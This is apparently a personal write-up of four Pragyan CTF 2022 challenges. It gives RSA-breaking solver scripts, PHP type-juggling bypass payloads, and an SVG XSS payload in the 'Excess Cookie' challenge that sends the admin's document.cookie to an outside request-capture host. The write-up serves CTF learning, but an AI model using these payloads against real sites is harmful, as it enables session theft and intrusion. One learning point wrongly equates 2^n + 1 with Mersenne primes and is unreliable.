# Pragyan CTF 2022 – Challenges (that i found interesting lol)

## Challenge 1: Blind Scout (Crypto)

### TLDR

- We are given 6 RSA public keys
- Try to find a gcd between any public key and decrypt cipher text
- Ciphertext is in a braille encoding in binary

### Solver

```
from Crypto.PublicKey import RSA
from math import gcd
def checkMods():

    pubkeys = []

    for i in range(1,6):
        with open(f'pub{i}.pem', 'r') as f:
            data = ''.join(f.readlines())
            pubkeys.append(RSA.importKey(data).n)
    for i in range(len(pubkeys)):
        for j in range(i+1,len(pubkeys)):
            if(gcd(pubkeys[i], pubkeys[j]) > 1):
                print("n1:", pubkeys[i])
                print("n2:", pubkeys[j])

from base64 import b64decode
from libnum import s2n,n2s
from Crypto.Util.number import isPrime
e = 65537
n1= 139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201
n2= 101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961

p = gcd(n1,n2)
q1 = n1//p
q2 = n2//p

assert p*q1 == n1
assert p*q2 == n2


phi1 = (p-1)*(q1-1)
phi2 = (p-1)*(q2-1)

from gmpy2 import invert
d1 = int(invert(e,phi1))
d2 = int(invert(e,phi2))


ct = "Z9jO5jqN9+fKNYJ14xA3QV96x4AlIIjOwoGSSq2D0G6ddMnKipNJkS2n0IS3blQAMym5dnzKC5MIetKikgozmzruuKDn2Xbkdv529Na2MXizJEMTxP/ioYzUFl2rJfg7xvyrNxEyPRWoJievmjpnum2pkrWAknAb+6Hj0Qv5yIo="
ct = s2n(b64decode(ct))

pt1 = n2s(pow(ct, d1, n1))
pt2 = n2s(pow(ct, d2, n2))
print(pt1)
print(pt2)
```

### Learning Points

- Braille can be encoded in 0101 (binary)

## Challenge 2: Excess Cookie v1 (web)

### TLDR

- You can upload a profile pic and force admin to visit the profile
- Make a svg profile pic that makes a http req when loaded with a request capturer

### Solver

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    document.write(new Image().src="https://asdfasdfasdf.free.beeceptor.com/" + document.cookie);
    alert(document.domain);

  </script>
</svg>
```

### Learning Points

- SVG can be used for XSS

## Challenge 3: Perfect Puzzle (Crypto)

### TLDR

- Based on the fact that 1 + 1/(i1) + 1/(i2) ... 1/(in) = 2 where in are the factors of the input, we can guess the `Xemu` input
- Iterate through all possible primes made up of such a number and find the factors of the modulus and RSA decrypt

### Challenge Script

```python
from Crypto.Util.number import getPrime, bytes_to_long
from random import randint
from flag import flag


def getprime(N):
    a = randint(0, N)
    return getPrime(a)


def invdivsum(a):
    ret = 0
    for i in range(a):
        if a % (i+1) == 0:
            ret += 1/(i+1)
    return ret


p = getprime(1024)
q = getprime(1024)
n = p*q
e = 65537
flag_int = bytes_to_long(flag.encode())
CipherText = pow(flag_int, e, n)
Xemu = getprime(1024)
Alice = p + Xemu ** 2
Bob = q * Xemu
sum = Xemu*(Xemu+1) >> 1
Result = invdivsum(sum)
output = f"CipherText={CipherText}"
output += f"\nAlice={Alice}"
output += f"\nBob={Bob}"
output += f"\nResult={Result}"
print(output)
# CipherText=149596971555589076155364186420580570749374401138608961998290009825114263148416772478651277321234724062278466223025831775035224109103887370927097231230324908201908263749968832767737017862796581877535194538767636598004538397685647433625803605580636107271455294998120570215920206140799513104969815764397323782297061528436771406170006449117531288516762624306954764709977440515034071280736026924741057203047657693649914954727759355179977253548864147305088480009948437
# Alice=282107567413424138126415916172126379762973487029431335677677351999909735485304760228208386658075380503123901137419658654328175448732740174233462536318627304974901304879611754592414594362308597516549359004265409028150117237817823179344527892839743549388806946124113890322466683297081312475367783738162570544520549179569150033008482592884468354854459703961697842606812
# Bob=66444211849564598649204285138638077348678558382508976397654912859551087895603398701542655997585482323573895063934558694018052442406995794312376093987279068684491709029458439225825559371474422839752950009253788191772668126664288610488535211383255806288769703027437108720296265682565379886651381942112538908474625781728851722312089113677698489150478927871052981645551018211694817730263647445568601019977068831413100897642519594589716447525199022801203505747758062305119871983246399979915166157
# Result=2.0

```

### Solver

```python

from Crypto.Util.number import isPrime
def getPrimes():
    ret = 1
    for i in range(1,10000):
        # ret += 1/(i+1)
        i = 2**i
        ret *= i
        if isPrime((ret)*2-1):
            x = (ret)*2-1
            print(x, i, x.bit_length())
# getPrimes()

def invdivsum(a):
    a = a*(a+1) >> 1
    ret = 0
    for i in range(a):
        if a % (i+1) == 0:
            ret += 1/(i+1)
            # print(i+1)
        if(ret >= 2.0): return ret
    return ret
possible = []
def test():
    ret = 1
    for i in range(1050):
        ret += 1/(2**(i+1))
        if(ret >= 2.0 and isPrime(2**i *2 -1)):
            print(i,2**i *2 -1)
            possible.append(2**i *2 -1)
test()

from gmpy2 import invert
from libnum import n2s
e = 65537
ct=149596971555589076155364186420580570749374401138608961998290009825114263148416772478651277321234724062278466223025831775035224109103887370927097231230324908201908263749968832767737017862796581877535194538767636598004538397685647433625803605580636107271455294998120570215920206140799513104969815764397323782297061528436771406170006449117531288516762624306954764709977440515034071280736026924741057203047657693649914954727759355179977253548864147305088480009948437
Alice=282107567413424138126415916172126379762973487029431335677677351999909735485304760228208386658075380503123901137419658654328175448732740174233462536318627304974901304879611754592414594362308597516549359004265409028150117237817823179344527892839743549388806946124113890322466683297081312475367783738162570544520549179569150033008482592884468354854459703961697842606812
Bob=66444211849564598649204285138638077348678558382508976397654912859551087895603398701542655997585482323573895063934558694018052442406995794312376093987279068684491709029458439225825559371474422839752950009253788191772668126664288610488535211383255806288769703027437108720296265682565379886651381942112538908474625781728851722312089113677698489150478927871052981645551018211694817730263647445568601019977068831413100897642519594589716447525199022801203505747758062305119871983246399979915166157
for i in possible:
    if Bob % i == 0:

        p = Alice - i**2
        q = Bob //i
        phi = (p-1)*(q-1)
        n = p*q
        d = int(invert(e,phi))
        pt = n2s(pow(ct,d,n))
        print(pt)
    else:
        print("sad")



# print(invdivsum(possible[0]))
```

### Learning Points

- 2^n + 1 == Perfect Prime == Mersenne Prime

## Challenge 4: PHP Train (Web)

### TLDR

- Just bypass all php's type juggling

### Challenge Source Code

```php
<?php
    show_source("index.php");
    include 'constants.php';
    error_reporting(0);
    if(isset($_GET["param1"])) {
        if(!strcmp($_GET["param1"], CONSTANT1)) {
            echo FLAG1;
        }
    }

    if(isset($_GET["param2"]) && isset($_GET["param3"])) {
        $str2 = $_GET["param2"];
        $str3 = $_GET["param3"];
        if(($str2 !== $str3) && (sha1($str2) === sha1($str3))) {
            echo FLAG2;
        }
    }

    if(isset($_GET["param4"])) {
        $str4 = $_GET["param4"];
        $str4=trim($str4);
        if($str4 == '1.2e3' && $str4 !== '1.2e3') {
            echo FLAG3;
        }
    }

    if(isset($_GET["param5"])) {
        $str5 = $_GET["param5"];
        if($str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2) {
            echo FLAG4;
        }
    }

    if(isset($_GET["param6"])) {
        $str6 = $_GET["param6"];
        if(hash('md4', $str6) == 0) {
            echo FLAG5;
        }
    }

    if(isset($_GET["param7"])) {
        $str7 = $_GET["param7"];
        $var1 = 'helloworld';
        $var2 = preg_replace("/$var1/", '', $str7);
        if($var1 === $var2) {
            echo FLAG6;
        }
    }

    if(isset($_GET["param8"])) {
        $str8 = $_GET["param8"];
        $comp = range(1, 25);
        if(in_array($str8, $comp)) {
            if(preg_match("/\.env/", $str8)) {
                echo FLAG7;
            }
        }
    }

?>
```

### Solver

```php

Condition: !strcmp($_GET["param1"], CONSTANT1)
Solution: param1[]=

Condition: ($param2 !== $param3) && (sha1($param2) === sha1($param3)
Solution: param2[]=&param3[[]]=

Condition: $param4=trim($param4);if($param4 == '1.2e3' && $param4 !== '1.2e3')
Solution: param4=1200

Condition: $str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2
Solution: param5=89%20

Condition: hash('md4', $param6) == 0
Solution: param6=0e001233333333333334557778889&

Condition:
 $var1 = 'helloworld';
 $var2 = preg_replace("/$var1/", '', $param7);
Solution: param7=hellohelloworldworld

Condition:
  $comp = range(1, 25);
  if(in_array($str8, $comp)) {
      if(preg_match("/\.env/", $str8)) {
          echo FLAG7;
      }
  }
Solution: param8=1.env


Payload:
"?param1[]=&param2[]=&param3[[]]=&param4=1200&param5=89%20&param6=0e001233333333333334557778889&param7=hellohelloworldworld&param8=1.env"
```

### Learning Points

- All the PHP bypasses!
